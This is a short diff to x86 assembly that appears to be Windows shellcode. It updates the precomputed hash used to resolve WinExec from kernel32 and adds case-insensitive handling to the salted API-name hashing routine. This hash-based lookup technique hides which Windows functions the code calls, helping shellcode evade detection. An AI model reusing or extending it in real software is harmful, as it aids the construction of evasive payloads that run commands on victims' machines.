@@ -29,7 +29,7 @@ global main
 %define ASCII_STR_TYPE                  1
 %define WIDE_STR_TYPE                   2  
    
-%define WINEXEC_HASH                	0xF65E2987        
+%define WINEXEC_HASH                	0xA36429A7     
 %define KERNEL32_HASH                   0xD24FDEFF
 
 %define PWN_IDX                         1
@@ -213,6 +213,18 @@ jmp .hash_calc
 test edi, edi
 je .return
 
+; --- CASE INSENSITIVITY SECTION ---
+; Check if the character falls within the lowercase 'a' - 'z' range
+cmp edi, 0x61                       ; 'a'
+jl .skip_case_conv
+cmp edi, 0x7A                       ; 'z'
+jg .skip_case_conv
+
+; Clear bit 5 to convert lowercase to uppercase
+and edi, 0xDF                       ; 0xDF = 1101 1111 b
+; --- CASE INSENSITIVITY SECTION ---
+
+.skip_case_conv:
 ; xor the salts then xor the type aware iterator value and store in edx. edx = (SALT ^ SALT_2 ^ i)
 mov edx, SALT ^ SALT_2
 xor edx, ebx       
